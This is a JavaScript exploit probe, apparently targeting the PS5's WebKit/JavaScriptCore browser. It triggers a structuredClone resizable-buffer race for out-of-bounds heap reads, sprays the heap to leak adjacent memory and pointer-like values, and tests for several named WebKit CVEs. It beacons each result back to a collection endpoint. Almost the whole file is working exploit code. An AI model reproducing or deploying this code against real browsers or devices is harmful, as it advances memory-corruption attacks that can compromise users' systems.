/* p70-escalate — TOCTOU OOB escalation + CVE oracle
 * V69T confirmed: structuredClone RAB getter-race gives OOB read.
 * This probe: (1) test reading beyond maxByteLength, (2) heap spray + leak,
 * (3) CVE-2023-38600 copyWithin OOB oracle, (4) CVE-2024-23222 type confusion detect.
 * Beacon prefix: V70E-
 */
(function(){
"use strict";
var RUN_ID = "v70e" + Math.random().toString(36).slice(2,12);
var PREFIX = "V70E-";

function B(tag, body) {
  try {
    var d = typeof body === "object" ? JSON.stringify(body) : String(body);
    fetch("/beacon/" + PREFIX + tag, {
      method: "POST", body: JSON.stringify({r: RUN_ID, b: d.slice(0,900)}),
      headers: {"Content-Type":"application/json"}
    }).catch(function(){});
  } catch(e){}
}
B("L", "press70-escalation+CVE oracle");

/* ====== Helper: TOCTOU clone with RAB shrink ====== */
function toctouClone(initialSize, maxSize, shrinkTo) {
  var rab = new ArrayBuffer(initialSize, { maxByteLength: maxSize });
  var u8 = new Uint8Array(rab);
  for (var i = 0; i < initialSize; i++) u8[i] = i & 0xFF;

  var obj = Object.create(null);
  obj.buf = rab;
  Object.defineProperty(obj, 'zz', { enumerable: true, get: function() {
    rab.resize(shrinkTo);
    return 1;
  }});

  var cloned = structuredClone(obj);
  return { clone: cloned, rab: rab };
}

/* ====== E1: Tight maxByteLength — does OOB go past allocation? ====== */
function test_E1() {
  var r = {};
  try {
    // maxByteLength = initialSize (no slack in allocation)
    var result = toctouClone(4096, 4096, 64);
    r.clonedLen = result.clone.buf.byteLength;
    r.OOB = r.clonedLen > 64;
    if (result.clone.buf) {
      var cv = new Uint8Array(result.clone.buf);
      // Bytes 64-4095: if these contain our pattern (i & 0xFF) they're from
      // the original allocation (within maxByteLength). If they contain
      // DIFFERENT data → heap OOB past allocation boundary
      var patternMatch = 0, nonPattern = 0, zeros = 0;
      for (var i = 64; i < Math.min(cv.length, 512); i++) {
        if (cv[i] === (i & 0xFF)) patternMatch++;
        else if (cv[i] === 0) zeros++;
        else nonPattern++;
      }
      r.pattern = patternMatch;
      r.zeros = zeros;
      r.foreign = nonPattern; // non-pattern, non-zero = foreign heap data!
      // Sample some bytes
      if (cv.length > 200) r.samples = [cv[100], cv[200], cv[500], cv[1000], cv[2000], cv[4000]];
    }
  } catch(e) { r.err = e.message.slice(0,80); }
  B("E1-TIGHT", r);
}

/* ====== E2: Very small maxByteLength ====== */
function test_E2() {
  var r = {};
  try {
    // 128B RAB, max=128, shrink to 8
    var result = toctouClone(128, 128, 8);
    r.clonedLen = result.clone.buf.byteLength;
    r.OOB = r.clonedLen > 8;
    if (result.clone.buf) {
      var cv = new Uint8Array(result.clone.buf);
      var foreign = 0;
      for (var i = 8; i < cv.length; i++) {
        if (cv[i] !== (i & 0xFF) && cv[i] !== 0) foreign++;
      }
      r.foreign = foreign;
      r.totalBytes = cv.length;
      // Dump first 32 bytes beyond shrink point
      var dump = [];
      for (var j = 8; j < Math.min(cv.length, 40); j++) dump.push(cv[j]);
      r.dump = dump.join(",");
    }
  } catch(e) { r.err = e.message.slice(0,80); }
  B("E2-SMALL", r);
}

/* ====== E3: Heap spray then TOCTOU — try to read sprayed objects ====== */
function test_E3() {
  var r = {};
  try {
    // Spray many objects of known size, then allocate RAB nearby
    var spray = [];
    for (var i = 0; i < 1000; i++) {
      var obj = { a: 0x41414141, b: 0x42424242, c: "SPRAY" + i };
      spray.push(obj);
    }

    // Allocate RAB (hopefully lands near sprayed objects)
    var rab = new ArrayBuffer(256, { maxByteLength: 256 });
    var u8 = new Uint8Array(rab);
    for (var j = 0; j < 256; j++) u8[j] = 0xAA;

    // More spray after RAB
    for (var k = 0; k < 1000; k++) {
      spray.push({ x: 0xDEADBEEF, y: new ArrayBuffer(64) });
    }

    var obj2 = Object.create(null);
    obj2.buf = rab;
    Object.defineProperty(obj2, 'zz', { enumerable: true, get: function() {
      rab.resize(16);
      return 1;
    }});

    var cloned = structuredClone(obj2);
    r.clonedLen = cloned.buf.byteLength;
    r.OOB = r.clonedLen > 16;

    if (cloned.buf) {
      var cv = new Uint8Array(cloned.buf);
      // Check for pointer-like values (non-0xAA, non-zero, 8-byte aligned)
      var interesting = [];
      var dv = new DataView(cloned.buf);
      for (var m = 16; m < cloned.buf.byteLength - 8; m += 8) {
        var hi = dv.getUint32(m, true);
        var lo = dv.getUint32(m + 4, true);
        // JSC pointers on PS5 (FreeBSD amd64): typically 0x0000007fxxxxxxxx range
        if (lo !== 0 && lo !== 0xAAAAAAAA && hi !== 0xAAAAAAAA) {
          interesting.push(m + ":0x" + lo.toString(16) + hi.toString(16).padStart(8,'0'));
          if (interesting.length > 8) break;
        }
      }
      r.ptrs = interesting;
      r.nonAA = 0;
      for (var n = 16; n < cv.length; n++) {
        if (cv[n] !== 0xAA && cv[n] !== 0) r.nonAA++;
      }
    }
    spray = null; // keep reference alive until here
  } catch(e) { r.err = e.message.slice(0,80); }
  B("E3-SPRAY", r);
}

/* ====== C1: CVE-2023-38600 — copyWithin OOB oracle ====== */
function test_C1() {
  var r = {};
  try {
    // CVE-2023-38600: TypedArray.copyWithin with a resizable backing buffer.
    // The bug: copyWithin checks bounds against the pre-resize length,
    // then the buffer resizes, and the copy goes OOB.
    // Fixed in WebKit ~July 2023 (Safari 16.6).
    // Our engine is ~Safari 17.0-17.3, so MIGHT be patched.

    // Test 1: copyWithin on RAB-backed TypedArray after resize
    var rab = new ArrayBuffer(256, { maxByteLength: 1024 });
    var ta = new Uint8Array(rab);
    for (var i = 0; i < 256; i++) ta[i] = i;

    // copyWithin(target, start, end) — copies ta[start..end) to ta[target..]
    // Normal case: copyWithin(128, 0, 64) copies bytes 0-63 to 128-191
    ta.copyWithin(128, 0, 64);
    r.normalCopy = ta[128] === 0 && ta[191] === 63;

    // Now: resize to 64, then try copyWithin that references old length
    rab.resize(64);
    r.resizedLen = ta.length; // should be 64 (length-tracking)

    try {
      // This SHOULD throw RangeError if properly bounds-checked
      // If it doesn't throw → bug is present
      ta.copyWithin(32, 0, 64);
      r.postResizeCopy = "OK-no-throw"; // might be fine if bounds are 0-63
    } catch(e) {
      r.postResizeCopy = e.name + ":" + e.message.slice(0,40);
    }

    // More aggressive: create a view with old length, then copy
    rab.resize(256);
    var ta2 = new Uint8Array(rab, 0, 256); // fixed-length view
    rab.resize(32); // shrink below view's fixed length

    try {
      // ta2 has fixed length 256 but backing is only 32 bytes
      // copyWithin on ta2 should use length 256 → OOB
      ta2.copyWithin(0, 128, 256);
      r.fixedViewCopy = "OK-no-throw"; // if no throw → OOB happened!
      // Check if we can read data
      try {
        r.ta2_0 = ta2[0];
        r.ta2_100 = ta2[100];
        r.COPYWITHIN_OOB = true;
      } catch(e2) {
        r.ta2Read = "ERR:" + e2.message.slice(0,30);
      }
    } catch(e) {
      r.fixedViewCopy = e.name + ":" + e.message.slice(0,40);
    }

    // Test 2: copyWithin with Atomics (if detach race possible)
    try {
      rab.resize(256);
      var ta3 = new Int32Array(rab);
      Atomics.store(ta3, 0, 0x41414141);
      r.atomicsOK = Atomics.load(ta3, 0) === 0x41414141;
    } catch(e) {
      r.atomicsErr = e.message.slice(0,40);
    }

  } catch(e) { r.err = e.message.slice(0,80); }
  B("C1-38600", r);
}

/* ====== C2: CVE-2024-23222 type confusion detection ====== */
function test_C2() {
  var r = {};
  try {
    // CVE-2024-23222: JSC type confusion via async generators and promises.
    // The "Coruna" exploit kit used this. Fixed in Safari 17.3 (Jan 2024).
    // If our engine is 17.0-17.2 → PRESENT.

    // Detection: test if async generator + promise interaction causes
    // unexpected type coercion. We can't trigger the actual vuln safely,
    // but we can probe for the specific behavior patterns.

    // Test: async generator yield + promise resolution ordering
    r.asyncGen = typeof async function*(){} === 'function';

    if (r.asyncGen) {
      // Create async generator that yields promises
      var gen = (async function*() {
        yield Promise.resolve(1);
        yield Promise.resolve(2);
        yield Promise.resolve(3);
      })();

      var results = [];
      gen.next().then(function(v) { results.push("n1:" + v.value); });
      gen.next().then(function(v) { results.push("n2:" + v.value); });
      gen.next().then(function(v) { results.push("n3:" + v.value); });
      gen.return(42).then(function(v) { results.push("ret:" + v.value); });

      // Wait for microtasks
      setTimeout(function() {
        r.results = results.join("|");
        r.asyncGenOK = true;

        // Test: for-await with early break (another 23222 trigger pattern)
        (async function() {
          try {
            var items = [];
            var ag = (async function*() {
              yield 10;
              yield 20;
              yield 30;
            })();
            for await (var item of ag) {
              items.push(item);
              if (item === 20) break; // early break from async iterator
            }
            r.forAwait = items.join(",");
            r.earlyBreak = items.length === 2;
          } catch(e) {
            r.forAwaitErr = e.message.slice(0,40);
          }
          B("C2-23222", r);
        })();
      }, 100);
    } else {
      r.asyncGen = false;
      B("C2-23222", r);
    }
  } catch(e) {
    r.err = e.message.slice(0,80);
    B("C2-23222", r);
  }
}

/* ====== C3: CVE-2023-42890 — processing web content OOB ====== */
function test_C3() {
  var r = {};
  try {
    // CVE-2023-42890: WebKit OOB access via crafted web content.
    // WebKit Bug 259830. Fixed in Safari 17.2 (Dec 2023).
    // If engine is 17.0-17.1 → PRESENT.

    // Feature detection: test for specific API behaviors changed in 17.2
    // Safari 17.2 added: CSS nesting, form-sizing, counter-set
    r.cssNesting = false;
    try {
      var sheet = new CSSStyleSheet();
      sheet.insertRule('div { & span { color: red; } }');
      r.cssNesting = true;
    } catch(e) { r.cssNestingErr = e.name; }

    // Test for Set methods (Safari 17.0+)
    r.setUnion = typeof Set.prototype.union === 'function';
    r.setIntersection = typeof Set.prototype.intersection === 'function';

    // String.isWellFormed (Safari 17.0? 16.4?)
    r.isWellFormed = typeof String.prototype.isWellFormed === 'function';

    // URL.canParse (Safari 17.0+)
    r.canParse = typeof URL.canParse === 'function';

    // These narrow the version: if cssNesting=false → pre-17.2 → CVE-2023-42890 likely present
    // If setUnion=false → pre-17.0 → even more CVEs present

    r.versionHint = r.cssNesting ? ">=17.2" : (r.setUnion ? "17.0-17.1" : "<17.0");

  } catch(e) { r.err = e.message.slice(0,80); }
  B("C3-42890", r);
}

/* ====== C4: CVE-2023-38600 deeper — copyWithin with getter resize ====== */
function test_C4() {
  var r = {};
  try {
    // Combine copyWithin with our getter-race: define a species constructor
    // or a getter that fires during copyWithin and resizes the buffer

    var rab = new ArrayBuffer(512, { maxByteLength: 2048 });
    var ta = new Uint8Array(rab);
    for (var i = 0; i < 512; i++) ta[i] = 0xDD;

    // Proxy-based approach: create a typed array subclass? Not possible.
    // Instead: use a custom Array-like with copyWithin
    // Actually test: does Uint8Array inherit a copyWithin that we can hook?

    // Direct test: ta.copyWithin while rab resizes from another context
    // Since no SAB, no true concurrency. But we can test the sequencing.

    // Test: sort with a comparison function that resizes
    var ta2 = new Uint8Array(rab);
    var sortCalls = 0;
    try {
      ta2.sort(function(a, b) {
        sortCalls++;
        if (sortCalls === 10) {
          try { rab.resize(64); } catch(e) {}
        }
        return a - b;
      });
      r.sortOK = true;
      r.sortCalls = sortCalls;
      r.taLenAfter = ta2.length;
      r.rabLenAfter = rab.byteLength;
      // If sort continued after resize, it may have read/written OOB
      r.SORT_OOB = ta2.length > rab.byteLength;
    } catch(e) {
      r.sortErr = e.name + ":" + e.message.slice(0,40);
      r.sortCalls = sortCalls;
    }

    // Test: slice with getter-like behavior
    rab.resize(512); // restore
    try {
      // TA.prototype.slice creates a new TA, reads [start, end)
      // If we can resize during slice...
      var Evil = {
        length: 512,
        0: 1, 1: 2,
        constructor: { [Symbol.species]: function(len) {
          rab.resize(32); // resize during species construction
          return new Uint8Array(len);
        }}
      };
      // This won't work directly on typed arrays, but test Array.from
      var fromResult = Array.from(ta2);
      r.fromLen = fromResult.length;
    } catch(e) {
      r.sliceErr = e.message.slice(0,40);
    }

  } catch(e) { r.err = e.message.slice(0,80); }
  B("C4-SORT-RESIZE", r);
}

/* ====== E4: TOCTOU with adjacent ArrayBuffer spray ====== */
function test_E4() {
  var r = {};
  try {
    // Allocate RAB with tight maxByteLength, surrounded by ArrayBuffers
    // with marker patterns. If OOB read goes past maxByteLength, we'd
    // see marker bytes from adjacent allocations.

    // Spray buffers with distinct markers BEFORE rab
    var pre = [];
    for (var i = 0; i < 200; i++) {
      var b = new ArrayBuffer(256);
      var v = new Uint8Array(b);
      for (var j = 0; j < 256; j++) v[j] = 0xBB;
      pre.push(b);
    }

    var rab = new ArrayBuffer(256, { maxByteLength: 256 });
    var u8 = new Uint8Array(rab);
    for (var k = 0; k < 256; k++) u8[k] = 0xAA;

    // Spray buffers with markers AFTER rab
    var post = [];
    for (var m = 0; m < 200; m++) {
      var b2 = new ArrayBuffer(256);
      var v2 = new Uint8Array(b2);
      for (var n = 0; n < 256; n++) v2[n] = 0xCC;
      post.push(b2);
    }

    // TOCTOU clone
    var obj = Object.create(null);
    obj.buf = rab;
    Object.defineProperty(obj, 'zz', { enumerable: true, get: function() {
      rab.resize(16);
      return 1;
    }});

    var cloned = structuredClone(obj);
    r.clonedLen = cloned.buf.byteLength;

    if (cloned.buf) {
      var cv = new Uint8Array(cloned.buf);
      var aa = 0, bb = 0, cc = 0, zero = 0, other = 0;
      for (var p = 16; p < cv.length; p++) {
        if (cv[p] === 0xAA) aa++;
        else if (cv[p] === 0xBB) bb++;
        else if (cv[p] === 0xCC) cc++;
        else if (cv[p] === 0) zero++;
        else other++;
      }
      r.aa = aa; // our pattern (within allocation)
      r.bb = bb; // pre-spray marker (adjacent alloc = HEAP OOB!)
      r.cc = cc; // post-spray marker (adjacent alloc = HEAP OOB!)
      r.zero = zero;
      r.other = other;
      r.HEAP_OOB = bb > 0 || cc > 0;
    }

    pre = null; post = null; // prevent GC before here
  } catch(e) { r.err = e.message.slice(0,80); }
  B("E4-ADJACENT", r);
}

/* ====== Run ====== */
try {
  test_E1();
  setTimeout(test_E2, 200);
  setTimeout(test_E3, 400);
  setTimeout(test_C1, 600);
  setTimeout(test_C2, 800);
  setTimeout(test_C3, 1100);
  setTimeout(test_C4, 1300);
  setTimeout(test_E4, 1500);
} catch(e) { B("FATAL", String(e).slice(0,200)); }

var hbI = setInterval(function(){ B("HB","hb"); }, 2000);
setTimeout(function(){ clearInterval(hbI); B("Z2","probe70-done"); }, 16000);
})();
